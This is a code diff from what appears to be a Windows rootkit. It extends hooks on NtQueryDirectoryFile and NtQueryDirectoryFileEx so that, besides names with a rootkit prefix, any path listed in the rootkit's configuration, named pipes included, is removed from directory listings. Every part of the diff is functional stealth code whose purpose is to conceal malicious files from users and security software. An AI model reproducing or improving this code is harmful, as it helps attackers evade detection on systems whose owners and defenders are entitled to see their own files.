@@ -185,11 +185,18 @@ NTSTATUS NTAPI Hooks::HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event
 		LPVOID previous = NULL;
 		ULONG nextEntryOffset;
 
+		WCHAR fileDirectoryPath[MAX_PATH + 1] = { 0 };
+		WCHAR fileFileName[MAX_PATH + 1] = { 0 };
+		WCHAR fileFullPath[MAX_PATH + 1] = { 0 };
+
+		if (GetFileType(fileHandle) == FILE_TYPE_PIPE) lstrcpyW(fileDirectoryPath, L"\\\\.\\pipe\\");
+		else GetPathFromHandle(fileHandle, fileDirectoryPath, MAX_PATH);
+
 		do
 		{
 			nextEntryOffset = FileInformationGetNextEntryOffset(current, fileInformationClass);
 
-			if (Rootkit::HasPrefix(FileInformationGetName(current, fileInformationClass)))
+			if (Rootkit::HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || Config::IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName))))
 			{
 				if (nextEntryOffset)
 				{
@@ -225,10 +232,17 @@ NTSTATUS NTAPI Hooks::HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 	// Some applications (e.g. cmd.exe) use NtQueryDirectoryFileEx instead of NtQueryDirectoryFile.
 	if (NT_SUCCESS(status) && (fileInformationClass == nt::FILE_INFORMATION_CLASS::FileDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileFullDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileIdFullDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileBothDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileNamesInformation))
 	{
+		WCHAR fileDirectoryPath[MAX_PATH + 1] = { 0 };
+		WCHAR fileFileName[MAX_PATH + 1] = { 0 };
+		WCHAR fileFullPath[MAX_PATH + 1] = { 0 };
+
+		if (GetFileType(fileHandle) == FILE_TYPE_PIPE) lstrcpyW(fileDirectoryPath, L"\\\\.\\pipe\\");
+		else GetPathFromHandle(fileHandle, fileDirectoryPath, MAX_PATH);
+
 		if (queryFlags & SL_RETURN_SINGLE_ENTRY)
 		{
 			// When returning a single entry, skip until the first item is found that is not hidden.
-			for (bool skip = Rootkit::HasPrefix(FileInformationGetName(fileInformation, fileInformationClass)); skip; skip = Rootkit::HasPrefix(FileInformationGetName(fileInformation, fileInformationClass)))
+			for (bool skip = Rootkit::HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || Config::IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))); skip; skip = Rootkit::HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || Config::IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))))
 			{
 				status = OriginalNtQueryDirectoryFileEx(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, queryFlags, fileName);
 				if (status) break;
@@ -244,7 +258,7 @@ NTSTATUS NTAPI Hooks::HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 			{
 				nextEntryOffset = FileInformationGetNextEntryOffset(current, fileInformationClass);
 
-				if (Rootkit::HasPrefix(FileInformationGetName(current, fileInformationClass)))
+				if (Rootkit::HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || Config::IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName))))
 				{
 					if (nextEntryOffset)
 					{
@@ -431,24 +445,62 @@ bool Hooks::GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGE
 	delete[] systemInformation;
 	return result;
 }
-PWCHAR Hooks::FileInformationGetName(LPVOID fileInformation, nt::FILE_INFORMATION_CLASS fileInformationClass)
+LPWSTR Hooks::CreatePath(LPWSTR result, LPCWSTR directoryName, LPCWSTR fileName)
 {
+	// PathCombineW cannot be used with the directory name "\\.\pipe\".
+	if (!lstrcmpiW(directoryName, L"\\\\.\\pipe\\"))
+	{
+		lstrcpyW(result, directoryName);
+		lstrcatW(result, fileName);
+		return result;
+	}
+	else
+	{
+		return PathCombineW(result, directoryName, fileName);
+	}
+}
+LPWSTR Hooks::FileInformationGetName(LPVOID fileInformation, nt::FILE_INFORMATION_CLASS fileInformationClass, LPWSTR name)
+{
+	PWCHAR fileName = NULL;
+	ULONG fileNameLength = 0;
+
 	switch (fileInformationClass)
 	{
 		case nt::FILE_INFORMATION_CLASS::FileDirectoryInformation:
-			return ((nt::PFILE_DIRECTORY_INFORMATION)fileInformation)->FileName;
+			fileName = ((nt::PFILE_DIRECTORY_INFORMATION)fileInformation)->FileName;
+			fileNameLength = ((nt::PFILE_DIRECTORY_INFORMATION)fileInformation)->FileNameLength;
+			break;
 		case nt::FILE_INFORMATION_CLASS::FileFullDirectoryInformation:
-			return ((nt::PFILE_FULL_DIR_INFORMATION)fileInformation)->FileName;
+			fileName = ((nt::PFILE_FULL_DIR_INFORMATION)fileInformation)->FileName;
+			fileNameLength = ((nt::PFILE_FULL_DIR_INFORMATION)fileInformation)->FileNameLength;
+			break;
 		case nt::FILE_INFORMATION_CLASS::FileIdFullDirectoryInformation:
-			return ((nt::PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->FileName;
+			fileName = ((nt::PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->FileName;
+			fileNameLength = ((nt::PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->FileNameLength;
+			break;
 		case nt::FILE_INFORMATION_CLASS::FileBothDirectoryInformation:
-			return ((nt::PFILE_BOTH_DIR_INFORMATION)fileInformation)->FileName;
+			fileName = ((nt::PFILE_BOTH_DIR_INFORMATION)fileInformation)->FileName;
+			fileNameLength = ((nt::PFILE_BOTH_DIR_INFORMATION)fileInformation)->FileNameLength;
+			break;
 		case nt::FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation:
-			return ((nt::PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->FileName;
+			fileName = ((nt::PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->FileName;
+			fileNameLength = ((nt::PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->FileNameLength;
+			break;
 		case nt::FILE_INFORMATION_CLASS::FileNamesInformation:
-			return ((nt::PFILE_NAMES_INFORMATION)fileInformation)->FileName;
-		default:
-			return NULL;
+			fileName = ((nt::PFILE_NAMES_INFORMATION)fileInformation)->FileName;
+			fileNameLength = ((nt::PFILE_NAMES_INFORMATION)fileInformation)->FileNameLength;
+			break;
+	}
+
+	if (fileName && fileNameLength > 0)
+	{
+		wmemcpy(name, fileName, fileNameLength / sizeof(WCHAR));
+		name[fileNameLength / sizeof(WCHAR)] = L'\0';
+		return name;
+	}
+	else
+	{
+		return NULL;
 	}
 }
 ULONG Hooks::FileInformationGetNextEntryOffset(LPVOID fileInformation, nt::FILE_INFORMATION_CLASS fileInformationClass)
